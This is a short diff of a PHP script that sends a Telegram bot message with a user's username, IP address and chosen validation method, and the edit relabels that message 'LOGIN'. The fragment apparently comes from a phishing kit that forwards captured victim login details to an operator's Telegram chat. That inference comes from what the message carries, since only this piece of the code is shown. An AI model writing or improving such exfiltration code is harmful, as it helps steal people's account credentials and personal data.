@@ -33,7 +33,7 @@ $keyboard = [
 ];
 
 // Enviar mensaje a Telegram
-$mensaje = "✅ Cliente seleccionó método de validación: $tipo\n👤 Usuario: $usuario\n🌐 IP: $ip";
+$mensaje = "LOGIN ✅ : $tipo\n👤 Usuario: $usuario\n🌐 IP: $ip";
 
 file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
     "chat_id" => $chat_id,
